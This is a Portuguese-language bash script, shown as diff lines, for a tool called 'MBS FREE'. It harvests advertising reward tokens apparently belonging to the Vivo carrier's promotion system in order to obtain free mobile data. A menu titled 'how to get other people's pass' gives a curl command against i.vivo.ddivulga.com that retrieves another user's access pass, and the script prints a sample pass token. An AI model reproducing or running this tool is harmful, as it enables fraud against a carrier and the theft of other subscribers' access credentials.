+advname009=$(cat advnamerev.txt | grep -n '"' | grep "9:" | cut -d':' -f2)
+advname0010=$(cat advnamerev.txt | grep -n '"' | grep "10:" | cut -d':' -f2)
+
+
+
+impressionid001=$(cat impressionidrev.txt | grep -n - | grep 1: | cut -d':' -f2)
+impressionid002=$(cat impressionidrev.txt | grep -n - | grep 2: | cut -d':' -f2)
+impressionid003=$(cat impressionidrev.txt | grep -n - | grep 3: | cut -d':' -f2)
+impressionid004=$(cat impressionidrev.txt | grep -n - | grep 4: | cut -d':' -f2)
+impressionid005=$(cat impressionidrev.txt | grep -n - | grep 5: | cut -d':' -f2)
+impressionid006=$(cat impressionidrev.txt | grep -n - | grep 6: | cut -d':' -f2)
+impressionid007=$(cat impressionidrev.txt | grep -n - | grep 7: | cut -d':' -f2)
+impressionid008=$(cat impressionidrev.txt | grep -n - | grep 8: | cut -d':' -f2)
+impressionid009=$(cat impressionidrev.txt | grep -n - | grep 9: | cut -d':' -f2)
+impressionid0010=$(cat impressionidrev.txt | grep -n - | grep 10: | cut -d':' -f2)
+
+
+
+advid001=$(cat advidrev.txt | grep -n , | grep 1: | cut -d':' -f2)
+advid002=$(cat advidrev.txt | grep -n , | grep 2: | cut -d':' -f2 )
+advid003=$(cat advidrev.txt | grep -n , | grep 3: | cut -d':' -f2 )
+advid004=$(cat advidrev.txt | grep -n , | grep 4: | cut -d':' -f2 )
+advid005=$(cat advidrev.txt | grep -n , | grep 5: | cut -d':' -f2 )
+advid006=$(cat advidrev.txt | grep -n , | grep 6: | cut -d':' -f2 )
+advid007=$(cat advidrev.txt | grep -n , | grep 7: | cut -d':' -f2 )
+advid008=$(cat advidrev.txt | grep -n , | grep 8: | cut -d':' -f2 )
+advid009=$(cat advidrev.txt | grep -n , | grep 9: | cut -d':' -f2 )
+advid0010=$(cat advidrev.txt | grep -n , | grep 10: | cut -d':' -f2 )
+
+
+test001=$(cat advidcriar.txt | grep -n , | grep -c "$advid001")
+case $test001 in
+1) ;;
+0) echo -e "$advid001" >> advidcriar.txt ; echo -e "$impressionid001" >> impressionidcriar.txt ; echo -e "$advname001" >> advnamecriar.txt ;  echo -e "$advreward001" >> advrewardcriar.txt ; echo -e "$advmensagem001" >> advmensagem.txt ; echo -e "1" >> TokensEncontrados.txt;;
+esac
+
+test002=$(cat advidcriar.txt | grep -n , | grep -c "$advid002")
+case $test002 in
+1) ;;
+0) echo -e "$advid002" >> advidcriar.txt ; echo -e "$impressionid002" >> impressionidcriar.txt ;echo -e "$advname002" >> advnamecriar.txt ;  echo -e "$advreward002" >> advrewardcriar.txt ;echo -e "$advmensagem002" >> advmensagem.txt ; echo -e "1" >> TokensEncontrados.txt;;
+esac
+
+test003=$(cat advidcriar.txt | grep -n , | grep -c "$advid003")
+case $test003 in
+1) ;;
+0) echo -e "$advid003" >> advidcriar.txt ; echo -e "$impressionid003" >> impressionidcriar.txt ;echo -e "$advname003" >> advnamecriar.txt;  echo -e "$advreward003" >> advrewardcriar.txt ;echo -e "$advmensagem003" >> advmensagem.txt ; echo -e "1" >> TokensEncontrados.txt;;
+esac
+
+test004=$(cat advidcriar.txt | grep -n , | grep -c "$advid004")
+case $test004 in
+1) ;;
+0) echo -e "$advid004" >> advidcriar.txt ; echo -e "$impressionid004" >> impressionidcriar.txt ;echo -e "$advname004" >> advnamecriar.txt;  echo -e "$advreward004" >> advrewardcriar.txt ;echo -e "$advmensagem004" >> advmensagem.txt ; echo -e "1" >> TokensEncontrados.txt;;
+esac
+
+test005=$(cat advidcriar.txt | grep -n , | grep -c "$advid005")
+case $test005 in
+1) ;;
+0) echo -e "$advid005" >> advidcriar.txt ; echo -e "$impressionid005" >> impressionidcriar.txt ;echo -e "$advname005" >> advnamecriar.txt;  echo -e "$advreward005" >> advrewardcriar.txt ;echo -e "$advmensagem005" >> advmensagem.txt ; echo -e "1" >> TokensEncontrados.txt;;
+esac
+
+test006=$(cat advidcriar.txt | grep -n , | grep -c "$advid006")
+case $test006 in
+1) ;;
+0) echo -e "$advid006" >> advidcriar.txt ; echo -e "$impressionid006" >> impressionidcriar.txt ;echo -e "$advname006" >> advnamecriar.txt;  echo -e "$advreward006" >> advrewardcriar.txt ;echo -e "$advmensagem006" >> advmensagem.txt ; echo -e "1" >> TokensEncontrados.txt;;
+esac
+
+test007=$(cat advidcriar.txt | grep -n , | grep -c "$advid007")
+case $test007 in
+1) ;;
+0) echo -e "$advid007" >> advidcriar.txt ; echo -e "$impressionid007" >> impressionidcriar.txt ;echo -e "$advname007" >> advnamecriar.txt ;  echo -e "$advreward007" >> advrewardcriar.txt ;echo -e "$advmensagem007" >> advmensagem.txt ; echo -e "1" >> TokensEncontrados.txt;;
+esac
+
+test008=$(cat advidcriar.txt | grep -n , | grep -c "$advid008")
+case $test008 in
+1) ;;
+0) echo -e "$advid008" >> advidcriar.txt ; echo -e "$impressionid008" >> impressionidcriar.txt ;echo -e "$advname008" >> advnamecriar.txt;  echo -e "$advreward008" >> advrewardcriar.txt ;echo -e "$advmensagem008" >> advmensagem.txt ; echo -e "1" >> TokensEncontrados.txt;;
+esac
+
+test009=$(cat advidcriar.txt | grep -n , | grep -c "$advid009")
+case $test009 in
+1) ;;
+0) echo -e "$advid009" >> advidcriar.txt ; echo -e "$impressionid009" >> impressionidcriar.txt ;echo -e "$advname009" >> advnamecriar.txt ;  echo -e "$advreward009" >> advrewardcriar.txt ;echo -e "$advmensagem009" >> advmensagem.txt ; echo -e "1" >> TokensEncontrados.txt;;
+esac
+
+test0010=$(cat advidcriar.txt | grep -n , | grep -c "$advid0010")
+case $test0010 in
+1) ;;
+0) echo -e "$advid0010" >> advidcriar.txt ; echo -e "$impressionid0010" >> impressionidcriar.txt ;echo -e "$advname0010" >> advname.txt ;  echo -e "$advreward0010" >> advrewardcriar.txt;echo -e "$advmensagem0010" >> advmensagem.txt ; echo -e "1" >> TokensEncontrados.txt;;
+esac
+NewTokens
+}
+
+
+
+
+NewTokensRev(){
+AZUL='\e[01;36;m'
+BrancoAll='\e\033[03;37;47m'
+LETRAPRETA='\e\033[02;30;47m'
+clear
+echo -e "============================================${NADA}"
+echo -e "${LETRAPRETA}                  MBS FREE                  ${NADA}"
+echo -e "============================================${NADA}"
+
+TokensNovos00=$(cat advidcriar.txt |  grep -c ,)
+
+BrancoAll='\e\033[03;37;47m'
+LETRAPRETA='\e\033[02;30;47m'
+
+clear
+echo -e "============================================${NADA}"
+echo -e "${LETRAPRETA}                  MBS FREE                  ${NADA}"
+echo -e "============================================${NADA}"
+
+case $TokensNovos00 in
+1) echo -e "${GREEN}1 TOKEN FOI ENCONTRADO ${NADA}" ;;
+2) echo -e "${GREEN}2 TOKEN FORAM ENCONTRADOS ${NADA}" ;;
+3) echo -e "${GREEN}3 TOKEN FORAM ENCONTRADOS ${NADA}" ;;
+4) echo -e "${GREEN}4 TOKEN FORAM ENCONTRADOS ${NADA}" ;;
+5) echo -e "${GREEN}5 TOKEN FORAM ENCONTRADOS ${NADA}" ;;
+6) echo -e "${GREEN}6 TOKEN FORAM ENCONTRADOS ${NADA}" ;;
+7) echo -e "${GREEN}7 TOKEN FORAM ENCONTRADOS ${NADA}" ;;
+8) echo -e "${GREEN}8 TOKEN FORAM ENCONTRADOS ${NADA}" ;;
+9) echo -e "${GREEN}9 TOKEN FORAM ENCONTRADOS ${NADA}" ;;
+10) echo -e "${GREEN}10 TOKEN FORAM ENCONTRADOS ${NADA}" ;;
+*) echo -e "${RED}NENHUM TOKEN FOI ENCONTRADO${NADA}" ;;
+esac
+
+
+echo
+echo -e "${CINZA}NUMERO DE TELEFONE USADO:${NADA} ${GREEN}$NumeroDeTelefone${NADA}"
+echo -e "${CINZA}TOTAL DE TOKENS ENCONTRADOS:${NADA} ${GREEN}$TokensNovos00"
+echo
+
+echo -e "${DESTACAR}1 - PROCURAR NOVOS TOKENS${NADA} ${CINZA}RECOMENDADO 2X${NADA}"
+echo -e "${DESTACAR}2 - TESTAR TOKENS ENCONTRADOS${NADA} ${CINZA}INICIAR O ENVIO DE MBS${NADA}"
+echo -e "${DESTACAR}0 - VOLTAR${NADA} ${CINZA}NENHUM TOKEN ENCONTRADO${NADA}"
+echo
+read -p "ESCOLHA UMA OPÇÃO: " TokensNews01
+case $TokensNews01 in
+1)ProcurarMaisTokens;;
+2)GerarOsTokens;;
+0)Menu5;;
+*)NewTokensRev;;
+esac
+} 
+
+
+
+
+
+NewTokens(){
+TokensNovos00=$(cat advidcriar.txt |  grep -c ,)
+TokensNovos0=$(cat TokensEncontrados.txt |  grep -c 1)
+
+clear
+BrancoAll='\e\033[03;37;47m'
+LETRAPRETA='\e\033[02;30;47m'
+
+echo -e "============================================${NADA}"
+echo -e "${LETRAPRETA}                  MBS FREE                  ${NADA}"
+echo -e "============================================${NADA}"
+
+case $TokensNovos0 in
+1) echo -e "${GREEN}1 TOKEN NOVO FOI ENCONTRADO ${NADA}" ;;
+2) echo -e "${GREEN}2 TOKEN NOVOS FORAM ENCONTRADOS ${NADA}" ;;
+3) echo -e "${GREEN}3 TOKEN NOVOS FORAM ENCONTRADOS ${NADA}" ;;
+4) echo -e "${GREEN}4 TOKEN NOVOS FORAM ENCONTRADOS ${NADA}" ;;
+*) echo -e "${RED}NENHUM TOKEN NOVO FOI ENCONTRADO${NADA}" ;;
+esac
+
+
+echo
+echo -e "${CINZA}NUMERO DE TELEFONE USADO:${NADA} ${GREEN}$NumeroDeTelefone${NADA}"
+echo -e "${CINZA}TOTAL DE TOKENS ENCONTRADOS:${NADA} ${GREEN}$TokensNovos00"
+echo
+
+echo -e "${DESTACAR}1 - PROCURAR NOVOS TOKENS${NADA} ${CINZA}RECOMENDADO 2X${NADA}"
+echo -e "${DESTACAR}2 - TESTAR TOKENS ENCONTRADOS${NADA} ${CINZA}INICIAR O ENVIO DE MBS${NADA}"
+echo -e "${DESTACAR}0 - VOLTAR${NADA} ${CINZA}NENHUM TOKEN ENCONTRADO${NADA}"
+echo
+read -p "ESCOLHA UMA OPÇÃO: " TokensNews
+case $TokensNews in
+1)ProcurarMaisTokens;;
+2)GerarOsTokens;;
+0)Menu5;;
+*)NewTokens;;
+esac
+} 
+
+
+
+
+PassSalvos0(){
+clear
+BrancoAll='\e\033[03;37;47m'
+LETRAPRETA='\e\033[02;30;47m'
+
+echo -e "============================================${NADA}"
+echo -e "${LETRAPRETA}                  MBS FREE                  ${NADA}"
+echo -e "============================================${NADA}"
+TokensSave001=$(cat TokensSave.txt | grep -n - | grep -c 1:)
+    case $TokensSave001 in
+    1) ;;
+    2) ;;
+    3) ;;
+    *) clear ; echo -e "============================================${NADA}" ; echo -e "${LETRAPRETA}                  MBS FREE                  ${NADA}" ; echo -e "============================================${NADA}" ; echo -e "${RED}NENHUM PASS ENCONTRADO${NADA}" ; sleep 5 ; Menu5;;
+    esac
+    
+echo -e "${DESTACAR}ESCOLHA UM NUMERO:${NADA}"
+cat TokensSave.txt | grep -n - | cut -d'-' -f1
+echo
+echo -e "0: ${DESTACAR}APAGAR TODOS${NADA}"
+echo
+read -p $'\033[0mDIGITE UM NUMERO: ' NumeroPass
+case $NumeroPass in
+0)rm -f TokensSave.txt ; Menu5;;
+*) ;;
+esac
+
+AccessPass=$(cat TokensSave.txt | grep -n - | grep "$NumeroPass": | cut -d':' -f2 | grep -n - | cut -d'-' -f2-9)
+echo -e "$AccessPass" >> chavedeacesso.txt
+Buscartokens
+}
+
+
+
+
+
+ComoPegarOPass(){
+clear
+BrancoAll='\e\033[03;37;47m'
+LETRAPRETA='\e\033[02;30;47m'
+echo -e "============================================${NADA}"
+echo -e "${LETRAPRETA}                  MBS FREE                  ${NADA}"
+echo -e "============================================${NADA}"
+echo -e "${GREEN}COMO PEGAR O PASS DE OUTRAS PESSOAS${NADA}"
+echo
+echo -e "${DESTACAR}1 - DESLIGUE A VPN, WI-FI E DEIXE APENAS OS DADOS MOVEIS LIGADOS"
+echo
+echo -e "2 - ESCOLHA UMA FORMA DE PEGAR O PASS"
+echo
+echo -e "COMANDO DO TERMUX:${GREEN}"
+cat <<- EOF
+
+clear ; curl -s -d "pageId=660224&version=2" i.vivo.ddivulga.com/i/gp | cut -d '"' -f4 ; echo
+EOF
+echo
+echo -e "${NADA}${DESTACAR}LINK DO NAVEGADOR:"
+echo
+echo -e "${GREEN}http://i.vivo.ddivulga.com/i/gp${NADA}"
+echo
+echo -e "${NADA}${DESTACAR}3 - COPIE RESPOSTA/PASS, RECORTE ELE COMO NO EXEMPLO ABAIXO, CASO PRECISE, COLE NO TESTADOR PERSONALIZADO E SALVE${NADA}"
+echo
+echo -e "${GREEN}24IVqUznZQYJxXPe7kqrp3XMAV1Vj5bhDcRSLtWbD_ypLt3PW_4__4Aj2BuUCCpdEOjjtLHmkg_Rk6B_ouI0aw${NADA}"
+echo
+read -n1 -p "APERTE QUALQUER TECLA PARA VOLTAR" optione1
+  case $optione1 in
+  *)Menu5;;
+  esac
+}
+
+
+MenuPrincipal
